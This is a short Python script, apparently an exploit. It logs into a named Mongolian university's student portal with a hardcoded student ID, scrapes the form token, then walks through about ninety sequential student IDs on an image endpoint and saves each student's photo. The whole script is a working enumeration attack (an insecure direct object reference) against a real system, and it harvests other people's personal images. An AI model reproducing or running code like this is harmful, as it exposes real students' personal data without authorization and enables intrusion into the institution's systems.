from requests import *
from pwn import log
from io import BytesIO
from PIL import Image

URL             = 'https://student.must.edu.mn/Login'
SESSION         = session()
DATA            = SESSION.get(URL)
FORMTOKEN       = DATA.text
INDEX           = FORMTOKEN.find('__RequestVerificationToken')
FORMTOKEN       = FORMTOKEN[INDEX+49:INDEX+157]

log.success(f'Form token: {FORMTOKEN}')
data = {
    'username': 'B170970065',
    'password': 'YOURPASSWORD',
    '__RequestVerificationToken': FORMTOKEN,
}
resp = SESSION.post(URL, data).text

if 'ШИНЭЭР ЭЛСЭГЧ ОЮУТНУУДЫН АНХААРАЛД!' in resp:
    log.success('Session created')

TARGET = 'https://student.must.edu.mn/Student/GetImage?u021EE='

BASE_TARGET     = 'B1709700'

for _ in range(10, 100):
    target = BASE_TARGET + str(_)
    epoint = TARGET + target
    data = SESSION.get(epoint, stream=True)
    im = Image.open(BytesIO(data.content))
    im.save(BASE_TARGET + str(_) + '.png')
    log.success(f'Done: {target}')

